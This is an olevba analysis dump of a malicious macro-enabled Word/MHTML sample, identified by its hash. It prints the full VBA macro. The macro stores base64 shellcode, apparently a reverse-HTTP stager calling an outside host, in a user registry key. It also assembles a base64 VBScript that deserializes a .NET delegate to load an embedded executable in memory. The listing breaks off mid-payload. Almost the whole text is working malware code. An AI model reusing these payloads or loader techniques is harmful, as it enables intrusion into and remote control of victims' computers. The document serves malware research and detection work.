## Uploaded by @JohnLaTwC
## Sample hash: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812

olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
MHT:MASIHBD- d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
===============================================================================
FILE: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
Type: MHTML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: None - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function addData()
    Dim data As String
    data = data & "/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCL"
data = data & "QHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxL"
data = data & "i1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6IAAAABNb3pp"
data = data & "bGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBXaW5kb3dzIE5UIDYuMjsgV2luNjQ7IHg2"
data = data & "NDsgVHJpZGVudC82LjApAFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY"
data = data & "WFhYWFhYWFhYAFkx/1dXV1dRaDpWeaf/1et5WzHJUVFqA1FRaFAAAABTUGhXiZ/G/9XrYlkx0lJo"
data = data & "AAJghFJSUlFSUGjrVS47/9WJxjH/V1dXV1ZoLQYYe//VhcB0RDH/hfZ0BIn56wloqsXiXf/VicFo"
data = data & "RSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S8Mf/rFetJ6Jn///8vQVpPcgAAaPC1olb/1WpA"
data = data & "aAAQAABoAABAAFdoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTNiwcBw4XAdeVYw+g3////"
data = data & "bnMxLmNhbWJvZGlhZGFpbHkub3JnAAAA"
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\AppDataLow\DataApp\Data", data, "REG_SZ"
    
End Function
Function addApp()
    Dim app As String
    app = app & "U3ViIFNldFZlcnNpb24KRGltIHNoZWxsClNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpCkRpbSB2ZXIK"
    app = app & "dmVyID0gInY0LjAuMzAzMTkiCk9uIEVycm9yIFJlc3VtZSBOZXh0CnNoZWxsLlJlZ1JlYWQgIkhLTE1cU09GVFdBUkVcXE1pY3Jv"
    app = app & "c29mdFwuTkVURnJhbWV3b3JrXHY0LjAuMzAzMTlcIgpJZiBFcnIuTnVtYmVyIDw+IDAgVGhlbgogIHZlciA9ICJ2Mi4wLjUwNzI3"
    app = app & "IgogIEVyci5DbGVhcgpFbmQgSWYKc2hlbGwuRW52aXJvbm1lbnQoIlByb2Nlc3MiKS5JdGVtKCJDT01QTFVTX1ZlcnNpb24iKSA9"
    app = app & "IHZlcgpFbmQgU3ViCkZ1bmN0aW9uIEJhc2U2NFRvU3RyZWFtKGIpCiAgRGltIGVuYywgbGVuZ3RoLCBiYSwgdHJhbnNmb3JtLCBt"
    app = app & "cwogIFNldCBlbmMgPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmciKQogIGxlbmd0aCA9IGVuYy5HZXRC"
    app = app & "eXRlQ291bnRfMihiKQogIFNldCB0cmFuc2Zvcm0gPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHku"
    app = app & "RnJvbUJhc2U2NFRyYW5zZm9ybSIpCiAgU2V0IG1zID0gQ3JlYXRlT2JqZWN0KCJTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtIikKICBt"
    app = app & "cy5Xcml0ZSB0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jayhlbmMuR2V0Qnl0ZXNfNChiKSwgMCwgbGVuZ3RoKSwgMCwgKChs"
    app = app & "ZW5ndGggLyA0KSAqIDMpCiAgbXMuUG9zaXRpb24gPSAwCiAgU2V0IEJhc2U2NFRvU3RyZWFtID0gbXMKRW5kIEZ1bmN0aW9uClN1"
    app = app & "YiBSdW4KRGltIHMsIGVudHJ5X2NsYXNzCnMgPSAiQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFDSlRlWE4wWlcwdVJHVnNa"
    app = app & "V2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeSIKcyA9IHMgJiAiQXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRd0IyMWxk"
    app = app & "R2h2WkRBREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaCIKcyA9IHMgJiAiZEdsdmJraHZiR1JsY2l0RVpXeGxa"
    app = app & "MkYwWlVWdWRISjVJbE41YzNSbGJTNUVaV3hsWjJGMFpWTmxjbWxoYkdsNllYUnBiMjVJYjJ4ayIKcyA9IHMgJiAiWlhJdlUzbHpk"
    app = app & "R1Z0TGxKbFpteGxZM1JwYjI0dVRXVnRZbVZ5U1c1bWIxTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSUpBZ0FBQUFrRCIKcyA9IHMg"
    app = app & "JiAiQUFBQUNRUUFBQUFFQWdBQUFEQlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1Zu"
    app = app & "WVhSbCIKcyA9IHMgJiAiUlc1MGNua0hBQUFBQkhSNWNHVUlZWE56WlcxaWJIa0dkR0Z5WjJWMEVuUmhjbWRsZEZSNWNHVkJjM05s"
    app = app & "YldKc2VRNTBZWEpuWlhSVSIKcyA9IHMgJiAiZVhCbFRtRnRaUXB0WlhSb2IyUk9ZVzFsRFdSbGJHVm5ZWFJsUlc1MGNua0JBUUlC"
    app = app & "QVFFRE1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObCIKcyA9IHMgJiAiY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZG"
    app = app & "Ym5SeWVRWUZBQUFBTDFONWMzUmxiUzVTZFc1MGFXMWxMbEpsYlc5MCIKcyA9IHMgJiAiYVc1bkxrMWxjM05oWjJsdVp5NUlaV0Zr"
    app = app & "WlhKSVlXNWtiR1Z5QmdZQUFBQkxiWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlNaTR3TGpBdSIKcyA9IHMgJiAiTUN3Z1EzVnNkSFZ5"
    app = app & "WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCZ2NBQUFBSCIKcyA9IHMgJiAi"
    app = app & "ZEdGeVoyVjBNQWtHQUFBQUJna0FBQUFQVTNsemRHVnRMa1JsYkdWbllYUmxCZ29BQUFBTlJIbHVZVzFwWTBsdWRtOXJaUW9FQXdB"
    app = app & "QSIKcyA9IHMgJiAiQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBaEVaV3hsWjJG"
    app = app & "MFpRZDBZWEpuWlhRdyIKcyA9IHMgJiAiQjIxbGRHaHZaREFEQndNd1UzbHpkR1Z0TGtSbGJHVm5ZWFJsVTJWeWFXRnNhWHBoZEds"
    app = app & "dmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdSIKcyA9IHMgJiAiZEhKNUFpOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhK"
    app = app & "SmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ2tMQUFBQSIKcyA9IHMgJiAiQ1F3QUFBQUpEUUFBQUFRRUFBQUFMMU41YzNS"
    app = app & "bGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dSIKcyA9IHMgJiAiU0c5c1pHVnlCZ0FBQUFS"
    app = app & "T1lXMWxERUZ6YzJWdFlteDVUbUZ0WlFsRGJHRnpjMDVoYldVSlUybG5ibUYwZFhKbENrMWxiV0psY2xSNSIKcyA9IHMgJiAiY0dV"
    app = app & "UVIyVnVaWEpwWTBGeVozVnRaVzUwY3dFQkFRRUFBd2dOVTNsemRHVnRMbFI1Y0dWYlhRa0tBQUFBQ1FZQUFBQUpDUUFBQUFZUiIK"
    app = app & "cyA9IHMgJiAiQUFBQUxGTjVjM1JsYlM1UFltcGxZM1FnUkhsdVlXMXBZMGx1ZG05clpTaFRlWE4wWlcwdVQySnFaV04wVzEwcENB"
    app = app & "QUFBQW9CQ3dBQSIKcyA9IHMgJiAiQUFJQUFBQUdFZ0FBQUNCVGVYTjBaVzB1V0cxc0xsTmphR1Z0WVM1WWJXeFdZV3gxWlVkbGRI"
    app = app & "UmxjZ1lUQUFBQVRWTjVjM1JsYlM1WSIKcyA9IHMgJiAiYld3c0lGWmxjbk5wYjI0OU1pNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpY"
    app = app & "VjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaCIKcyA9IHMgJiAiTldNMU5qRTVNelJsTURnNUJoUUFBQUFIZEdGeVoy"
    app = app & "VjBNQWtHQUFBQUJoWUFBQUFhVTNsemRHVnRMbEpsWm14bFkzUnBiMjR1UVhOeiIKcyA9IHMgJiAiWlcxaWJIa0dGd0FBQUFSTWIy"
    app = app & "RmtDZzhNQUFBQUFDSUFBQUpOV3BBQUF3QUFBQVFBQUFELy93QUF1QUFBQUFBQUFBQkFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFEaCs2RGdDMENjMGh1QUZNelNGVWFHbHpJSEJ5YjJkeSIKcyA9"
    app = app & "IHMgJiAiWVcwZ1kyRnVibTkwSUdKbElISjFiaUJwYmlCRVQxTWdiVzlrWlM0TkRRb2tBQUFBQUFBQUFGQkZBQUJNQVFNQXU3ZDJX"
    app = app & "UUFBQUFBQSIKcyA9IHMgJiAiQUFBQTRBQWlJQXNCTUFBQUdnQUFBQVlBQUFBQUFBQzJPUUFBQUNBQUFBQkFBQUFBQUFBUUFDQUFB"
    app = app & "QUFDQUFBRUFBQUFBQUFBQUFRQSIKcyA9IHMgJiAiQUFBQUFBQUFBSUFBQUFBQ0FBQUFBQUFBQXdCQWhRQUFFQUFBRUFBQUFBQVFB"
    app = app & "QUFRQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBWkRrQSIKcyA9IHMgJiAiQUU4QUFBQUFRQUFBYUFNQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQVlBQUFEQUFBQUN3NEFBQWNBQUFBQUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUFBZ0FBQUlBQUFBQUFBQUFBQUFBQUFJSUFBQVNBQUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUxuUmxl"
    app = app & "SFFBQUFDOEdRQUFBQ0FBQUFBYUFBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUlBQUFZQzV5YzNKakFBQUFhQU1BQUFCQSIKcyA9IHMg"
    app = app & "JiAiQUFBQUJBQUFBQndBQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1Y21Wc2IyTUFBQXdBQUFBQVlBQUFBQUlBQUFBZ0FBQUFBQUFB"
    app = app & "QUFBQSIKcyA9IHMgJiAiQUFBQUFBQkFBQUJDQUFBQUFBQUFBQUFBQUFBQUFBQUFBSmc1QUFBQUFBQUFTQUFBQUFJQUJRRFlJZ0FB"
    app = app & "VkJVQUFBRUFBQUFBQUFBQSIKcyA9IHMgJiAiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQUV6QUJBQlVBQUFBQiIKcyA9IHMgJiAiQUFBUkFpZ1BBQUFLZmhBQUFBb0tFZ0FvQlFBQUJpWXFBQUFB"
    app = app & "RXpBS0FGb0JBQUFDQUFBUktCRUFBQW9GTGdZRk90QUFBQUFES0JJQSIKcyA9IHMgJiAiQUFvS0VnSCtGUVlBQUFJU0F2NFZCUUFB"
    app = app & "QWhRRWZoQUFBQXArRUFBQUNoWWdCQUFBQ0g0UUFBQUtGQklCRWdJb0VBQUFCaVlJZXlRQSIKcyA9IHMgJiAiQUFSK0VBQUFDZ2FP"
    app = app & "YVg0QkFBQUVmZ0lBQUFRb0RnQUFCZzErRUFBQUNoTUVDSHNrQUFBRUNRWUdqbWtTQkNnTUFBQUdKaFlUQlFoNyIKcyA9IHMgJiAi"
    app = app & "SkFBQUJBa0dqbWwrQXdBQUJCSUZLQThBQUFZbUNIc21BQUFFS0JNQUFBcHZGQUFBQ2hNR0h4QVdFUVlXYnhVQUFBcHZGZ0FBQ2ln"
    app = app & "TCIKcyA9IHMgJiAiQUFBR0V3Y0pFUWQrRUFBQUNpZ05BQUFHSmdoN0pRQUFCQ2dSQUFBR0ppdDFLQmNBQUFvVENCRUlFUWdmSUc4"
    app = app & "WUFBQUtieGtBQUFvVCIKcyA9IHMgJiAiQ0FVZU15MG9HZ0FBQ204YkFBQUtieHdBQUFwdkhRQUFDbklCQUFCd2NoTUFBSEJ2SGdB"
    app = app & "QUNoRUlLQjhBQUFvbUt5c29HZ0FBQ204YiIKcyA9IHMgJiAiQUFBS2J4d0FBQXB2SFFBQUNuSVRBQUJ3Y2dFQUFIQnZIZ0FBQ2hF"
    app = app & "SUtCOEFBQW9tRmlnZ0FBQUtLZ0FBRXpBR0FOUUFBQUFEQUFBUiIKcyA9IHMgJiAiS0JFQUFBb0VMZ01FTFUwREtCSUFBQW9LZmhB"
    app = app & "QUFBb0dqbWwrQVFBQUJINERBQUFFS0FjQUFBWUxCaFlIQm81cEtDRUFBQXArRUFBQSIKcyA9IHMgJiAiQ2lZV0RINFFBQUFLRFJZ"
    app = app & "V0J3a1dFZ0lvQ1FBQUJoVW9DZ0FBQmlZcmRTZ1hBQUFLRXdRUkJCRUVIeUJ2R0FBQUNtOFpBQUFLRXdRRSIKcyA9IHMgJiAiSGpN"
    app = app & "dEtCb0FBQXB2R3dBQUNtOGNBQUFLYngwQUFBcHlBUUFBY0hJVEFBQndieDRBQUFvUkJDZ2ZBQUFLSmlzcktCb0FBQXB2R3dBQSIK"
    app = app & "cyA9IHMgJiAiQ204Y0FBQUtieDBBQUFweUV3QUFjSElCQUFCd2J4NEFBQW9SQkNnZkFBQUtKaFlvSUFBQUNpcGlJQUFRQUFDQUFR"
    app = app & "QUFCQnFBQWdBQSIKcyA9IHMgJiAiQkI5QWdBTUFBQVFxQUFBQVFsTktRZ0VBQVFBQUFBQUFEQUFBQUhZeUxqQXVOVEEzTWpjQUFB"
    app = app & "QUFCUUJzQUFBQVFBZ0FBQ04rQUFDcyIKcyA9IHMgJiAiQ0FBQU1Bb0FBQ05UZEhKcGJtZHpBQUFBQU53U0FBQW9BQUFBSTFWVEFB"
    app = app & "UVRBQUFRQUFBQUkwZFZTVVFBQUFBVUV3QUFRQUlBQUNOQyIKcyA9IHMgJiAiYkc5aUFBQUFBQUFBQUFJQUFBRlhIUUlVQ1FJQUFB"
    app = app & "RDZBVE1BRmdBQUFRQUFBQnNBQUFBSEFBQUFRd0FBQUJNQUFBQTVBQUFBSVFBQSIKcyA9IHMgJiAiQUNjQUFBQVJBQUFBQXdBQUFB"
    app = app & "SUFBQUFQQUFBQUFRQUFBQUlBQUFBRkFBQUFBQUJjQmdFQUFBQUFBQVlBU1FVZUNBWUF0Z1VlQ0FZQSIKcyA9IHMgJiAiZHdUUkJ3"
    app = app & "OEFQZ2dBQUFZQW53UUhCd1lBSFFVSEJ3WUEvZ1FIQndZQW5RVUhCd1lBYVFVSEJ3WUFnZ1VIQndZQXRnUUhCd1lBaXdULyIKcyA9"
    app = app & "IHMgJiAiQndZQWFRVC9Cd1lBNFFRSEJ3WUFaQW1BQmdvQUdRZlJCd1lBT2dXQUJnWUFod2FBQmdZQU1RU0FCZ1lBeGdlQUJnWUFz"
    app = app & "UW1BQmdvQSIKcyA9IHMgJiAiS0FuUkJ3b0FZZ1BSQndZQW53bUFCZ1lBTWdhQUJnb0EwUVBSQndZQVF3Yi9Cd0FBQUFBdUFBQUFB"
    app = app & "QUFCQUFFQUFRQVFBT0FJQUFBOSIKcyA9IHMgJiAiQUFFQUFRQUNBUUFBcVFnQUFFa0FCQUFVQUFJQkFBQ0VDQUFBU1FBU0FCUUFD"
    app = app & "Z0VRQUZnQkFBQk5BQ1FBRkFBS0FSQUFvd0VBQUUwQSIKcyA9IHMgJiAiS0FBVUFBSUJBQURxQ0FBQVNRQTZBQlFBRVFBWUFnY0JF"
    app = app & "UURJQUFjQkVRRFhBQWNCQmdha0FnY0JWb0JMQmdvQlZvQk1CQW9CVm9CQyIKcyA9IHMgJiAiQXdvQlZvRHdCZ29CVm9BVkF3b0JW"
    app = app & "b0JXQkFvQlZvQ1RBd29CVm9BSENRb0JWb0N6QWdvQlZvRFFCZ29CVm9EZkJnb0JWb0NqQmdvQiIKcyA9IHMgJiAiVm9BUEJnb0JC"
    app = app & "Z2FrQWdjQlZvRHVBQTRCVm9BM0FBNEJWb0IyQUE0QlZvQ1FBQTRCVm9DdkFRNEJWb0J6QWc0QlZvRFpBUTRCVm9ENCIKcyA9IHMg"
    app = app & "JiAiQUE0QlZvQXZBUTRCVm9BWkFRNEJWb0JsQUE0QlZvQWpBZzRCVm9BQUFnNEJWb0R5QVE0QlZvRElBUTRCVm9BK0FnNEJWb0NJ"
    app = app & "QWc0QiIKcyA9IHMgJiAiQmdBVkNSNEFCZ0JQQXg0QUJnRDZBZ2NCQmdEdkFnY0JCZ0M4QWdjQkJnQndBeElCQmdDQkJ4SUJCZ0M2"
    app = app & "QXhJQkJnQ0VBZ2NCQmdDZyIKcyA9IHMgJiAiQWdjQkJnRFVCUWNCQmdEY0JRY0JCZ0RFQ0FjQkJnRFNDQWNCQmdEUkJBY0JCZ0M4"
    app = app & "Q0FjQkJnRE9DUlVCQmdBS0FCVUJCZ0FXQUI0QSIKcyA9IHMgJiAiQmdDNUNSNEFCZ0REQ1I0QUJnQ3ZCeDRBQmdha0FoZ0JWb0N5"
    app = app & "QUJzQlZvQ2pBQnNCVm9CYkFoc0JWb0JuQWhzQlZvQnNBUnNCVm9COCIKcyA9IHMgJiAiQVJzQlZvQkhBUnNCVm9DOEFCc0JWb0NP"
    app = app & "QVJzQlVDQUFBQUFBaGhpNUJ3WUFBUUIwSUFBQUFBQ0dBR3NKSHdFQkFOd2hBQUFBQUlZQSIKcyA9IHMgJiAiWndZbUFRUUFBQUFB"
    app = app & "QUlBQWxpRElBaXdCQmdBQUFBQUFnQUNSSURFSE1nRUlBQUFBQUFDQUFKRWdVQWM0QVFrQUFBQUFBSUFBa1NEUSIKcyA9IHMgJiAi"
    app = app & "QWowQkNnQUFBQUFBZ0FDUklJY0RSUUVPQUFBQUFBQ0FBSkVnUWdOTUFSRUFBQUFBQUlBQWtTQlhDVmNCRndBQUFBQUFnQUNXSUZj"
    app = app & "RCIKcyA9IHMgJiAiWFFFWkFBQUFBQUNBQUpZZ0NBcGxBUndBQUFBQUFJQUFsaUJZQUhBQklRQUFBQUFBZ0FDV0lPTUpkd0VrQUFB"
    app = app & "QUFBQ0FBSkVnOGdtQSIKcyA9IHMgJiAiQVNrQUFBQUFBSUFBbGlBSENZb0JMZ0FBQUFBQWdBQ1dJRFVEblFFNEFBQUFBQUNBQUpZ"
    app = app & "Z0p3T2RBVGtBdkNJQUFBQUFrUmkvQjZJQiIKcyA9IHMgJiAiT2dBQUFBRUFJZ0FBQUFJQWV3TUFBQU1BN1FVQUFBRUFJZ0FBQUFJ"
    app = app & "QTdRVUFBQUVBL2dNQUFBSUEyZ2tBQUFFQXpRY0FBQUVBelFjQSIKcyA9IHMgJiAiQUFFQWl3Y0FBQUlBR3dZQUFBTUFPd1FBQUFR"
    app = app & "QWdRa0FBQUVBUGdrQUFBSUFDQVlBQUFNQUpnUUFBQUVBWFFnQUFBSUE5Z1VBQUFNQSIKcyA9IHMgJiAiU0FrQUFBUUFjUVlBQUFV"
    app = app & "QW1RZ0FBQVlBNUFJQUFBRUFvd01BQUFJQThBY0FBQUVBOXdnQUFBSUFxd01BQUFNQTd3SUFBQUVBRlFrQSIKcyA9IHMgJiAiQUFJ"
    app = app & "QU1Ba0FBQU1BbmdjQUFBUUFBZ1lDQUFVQWpBWUFBQUVBVVFBQUFBSUFUd01BQUFNQXJBSUFBQUVBRlFrQUFBSUFQZ2tBQUFNQSIK"
    app = app & "cyA9IHMgJiAiQ0FZQUFBUUFPd1FBQUFVQWdRa0FBQUVBRlFrQUFBSUFQZ2tBQUFNQUNBWUFBQVFBaXdrQ0FBVUFjZ2tBQUFFQTdB"
    app = app & "TUFBQUlBR0FRQSIKcyA9IHMgJiAiQUFNQWNBZ0FBQVFBWFFnQUFBVUFUUWdBQUFZQW1RZ0FBQWNBblFrQUFBZ0FHd29BQUFrQWJn"
    app = app & "Y0NBQW9BdXdZQUFBRUFUd01BQUFFQSIKcyA9IHMgJiAiVHdNSkFMa0hBUUFSQUxrSEJnQVpBTGtIQ2dBcEFMa0hFQUF4QUxrSEVB"
    app = app & "QTVBTGtIRUFCQkFMa0hFQUJKQUxrSEVBQlJBTGtIRUFCWiIKcyA9IHMgJiAiQUxrSEVBQmhBTGtIRlFCcEFMa0hFQUJ4QUxrSEVB"
    app = app & "Q0pBTGtIQmdCNUFMa0hCZ0NoQUh3SEhnQ2hBT1FGTVFDcEFDZ0dOUUN4QUFZRCIKcyA9IHMgJiAiT3dDeEFPUUhRUUNCQUhjR1Jn"
    app = app & "QzVBTjBDVEFEQkFBZ0VVQURKQUNBR1ZBREpBRGtHV1FDeEFCNEpYZ0N4QU1JRFl3RFJBTjhEYUFESiIKcyA9IHMgJiAiQUtjSGFB"
    app = app & "REpBSDhEYkFDeEFLc0pjZ0RCQUpnSmVRRFpBQU1LaHdBSkFCUUFtUUFKQUJnQW5nQUpBQndBb3dBSkFDQUFxQUFKQUNRQSIKcyA9"
    app = app & "IHMgJiAiclFBSkFDZ0FzZ0FKQUN3QXR3QUpBREFBdkFBSkFEUUF3UUFKQURnQXhnQUpBRHdBeXdBSkFFQUEwQUFKQUVRQTFRQUpB"
    app = app & "RXdBMmdBSiIKcyA9IHMgJiAiQUZBQTN3QUpBRlFBNUFBSkFGZ0FyUUFKQUZ3QXhnQUpBR0FBNlFBSkFHUUE3Z0FKQUdnQTh3QUpB"
    app = app & "R3dBMEFBSkFIQUEwQUFKQUhRQSIKcyA9IHMgJiAiK0FBSkFIZ0F5d0FKQUh3QW93QUpBSUFBbmdBSkFJUUFxQUFKQUlnQS9RQUpB"
    app = app & "SXdBQWdFSUFPd0FuZ0FJQVBBQW93QUlBUFFBcUFBSSIKcyA9IHMgJiAiQVBnQXJRQUlBUHdBc2dBSUFBQUJ0d0FJQUFRQnZBQUlB"
    app = app & "QWdCd1FBSUFBd0J4Z0F1QUFzQXBnRXVBQk1BcndFdUFCc0F6Z0V1QUNNQSIKcyA9IHMgJiAiMXdFdUFDc0E0d0V1QURNQTR3RXVB"
    app = app & "RHNBNHdFdUFFTUExd0V1QUVzQTZRRXVBRk1BNHdFdUFGc0E0d0V1QUdNQUFRSXVBR3NBS3dKRCIKcyA9IHMgJiAiQUZzQU9BSmpB"
    app = app & "SE1BbmdDREFITUFuZ0RqQUhNQW5nQWFBQ0VBZmdCUEJnRUFBQUVKQU1nQ0FRQkFBUXNBTVFjQkFFQUJEUUJRQndFQSIKcyA9IHMg"
    app = app & "JiAiQUFFUEFOQUNBZ0FBQVJFQWh3TUNBQUFCRXdCQ0F3SUFBQUVWQUZjSkFnQkFBUmNBVndNQkFFQUJHUUFJQ2dFQUFBRWJBRmdB"
    app = app & "QVFCQSIKcyA9IHMgJiAiQVIwQTR3a0JBQUFCSHdEeUNRRUFBQUVoQUFjSkFRQUFBU01BTlFNQkFBQUJKUUFuQXdFQUJJQUFBQUVB"
    app = app & "QUFBQUFBQUFBQUFBQUFBQSIKcyA9IHMgJiAibHdjQUFBSUFBQUFBQUFBQUFBQUFBSkFBdndJQUFBQUFBZ0FBQUFBQUFBQUFBQUFB"
    app = app & "a0FDQUJnQUFBQUFEQUFJQUJBQUNBQVVBQWdBRyIKcyA9IHMgJiAiQUFJQUJ3QUNBQUFBQUd0bGNtNWxiRE15QUdOaVVtVnpaWEoy"
    app = app & "WldReUFHeHdVbVZ6WlhKMlpXUXlBSE5vWld4c1ltRnpaVFkwQUR4TiIKcyA9IHMgJiAiYjJSMWJHVStBRU5TUlVGVVJWOUNVa1ZC"
    app = app & "UzBGWFFWbGZSbEpQVFY5S1QwSUFjR1p1UVZCREFGRjFaWFZsVlhObGNrRlFRd0JEVWtWQiIKcyA9IHMgJiAiVkVWZlUxVlRVRVZP"
    app = app & "UkVWRUFFTlNSVUZVUlY5RVJVWkJWVXhVWDBWU1VrOVNYMDFQUkVVQVExSkZRVlJGWDA1RlYxOURUMDVUVDB4RiIKcyA9IHMgJiAi"
    app = app & "QUZOVlUxQkZUa1JmVWtWVFZVMUZBRlJGVWsxSlRrRlVSUUJKVFZCRlVsTlBUa0ZVUlFCUVFVZEZYMUpGUVVSWFVrbFVSUUJRUVVk"
    app = app & "RiIKcyA9IHMgJiAiWDBWWVJVTlZWRVZmVWtWQlJGZFNTVlJGQUZwRlVrOWZSa3hCUndCRFVrVkJWRVZmVUZKRlUwVlNWa1ZmUTA5"
    app = app & "RVJWOUJWVlJJV2w5TSIKcyA9IHMgJiAiUlZaRlRBQkRVa1ZCVkVWZlUwaEJVa1ZFWDFkUFYxOVdSRTBBUTFKRlFWUkZYMU5GVUVG"
    app = app & "U1FWUkZYMWRQVjE5V1JFMEFVMFZVWDFSSSIKcyA9IHMgJiAiVWtWQlJGOVVUMHRGVGdCUVVrOURSVk5UWDBsT1JrOVNUVUZVU1U5"
    app = app & "T0FGTkZWRjlKVGtaUFVrMUJWRWxQVGdCUlZVVlNXVjlKVGtaUCIKcyA9IHMgJiAiVWsxQlZFbFBUZ0JFU1ZKRlExUmZTVTFRUlZK"
    app = app & "VFQwNUJWRWxQVGdCVFZFRlNWRlZRU1U1R1R3QkRVa1ZCVkVWZlRrVlhYMUJTVDBORiIKcyA9IHMgJiAiVTFOZlIxSlBWVkFBUkVW"
    app = app & "VVFVTklSVVJmVUZKUFEwVlRVd0JEVWtWQlZFVmZVRkpQVkVWRFZFVkVYMUJTVDBORlUxTUFSRVZDVlVkZiIKcyA9IHMgJiAiVUZK"
    app = app & "UFEwVlRVd0JFUlVKVlIxOVBUa3haWDFSSVNWTmZVRkpQUTBWVFV3Qk5SVTFmUTA5TlRVbFVBRU5TUlVGVVJWOVZUa2xEVDBSRiIK"
    app = app & "cyA9IHMgJiAiWDBWT1ZrbFNUMDVOUlU1VUFFVllWRVZPUkVWRVgxTlVRVkpVVlZCSlRrWlBYMUJTUlZORlRsUUFSMFZVWDBOUFRs"
    app = app & "UkZXRlFBVTBWVSIKcyA9IHMgJiAiWDBOUFRsUkZXRlFBUTFKRlFWUkZYMDVQWDFkSlRrUlBWd0JrZDFnQVNVNUlSVkpKVkY5UVFW"
    app = app & "SkZUbFJmUVVaR1NVNUpWRmtBWkhkWiIKcyA9IHMgJiAiQUhaaGJIVmxYMThBWkhkRVlYUmhBRk5sZEZGMWIzUmhBR05pQUcxelky"
    app = app & "OXliR2xpQUZkcGJrVjRaV01BVm1seWRIVmhiRUZzYkc5aiIKcyA9IHMgJiAiQUdkbGRGOUpaQUJzY0ZSb2NtVmhaRWxrQUdSM1ZH"
    app = app & "aHlaV0ZrU1dRQVpIZFFjbTlqWlhOelNXUUFSMlYwVUhKdlkyVnpjMEo1U1dRQSIKcyA9IHMgJiAiVm1seWRIVmhiRTFsYlc5eWVW"
    app = app & "SmxZV1FBVTNWemNHVnVaRlJvY21WaFpBQlNaWE4xYldWVWFISmxZV1FBUTNKbFlYUmxWR2h5WldGayIKcyA9IHMgJiAiQUdoVWFI"
    app = app & "SmxZV1FBVDNCbGJsUm9jbVZoWkFCUWNtOWpaWE56VkdoeVpXRmtBR3h3VW1WelpYSjJaV1FBWTIxa0FGSmxjR3hoWTJVQSIKcyA9"
    app = app & "IHMgJiAiVm1seWRIVmhiRVp5WldVQVJIVndiR2xqWVhSbFNHRnVaR3hsQUdoSVlXNWtiR1VBWWtsdWFHVnlhWFJJWVc1a2JHVUFi"
    app = app & "SEJVYVhScyIKcyA9IHMgJiAiWlFCblpYUmZUV0ZwYmsxdlpIVnNaUUJRY205alpYTnpUVzlrZFd4bEFHZGxkRjlHYVd4bFRtRnRa"
    app = app & "UUJzY0VGd2NHeHBZMkYwYVc5dSIKcyA9IHMgJiAiVG1GdFpRQkpjRU50WkV4cGJtVUFaMlYwWDBOdmJXMWhibVJNYVc1bEFHeHdR"
    app = app & "Mjl0YldGdVpFeHBibVVBWkhkR2NtVmxWSGx3WlFCVyIKcyA9IHMgJiAiWVd4MVpWUjVjR1VBWm14QmJHeHZZMkYwYVc5dVZIbHda"
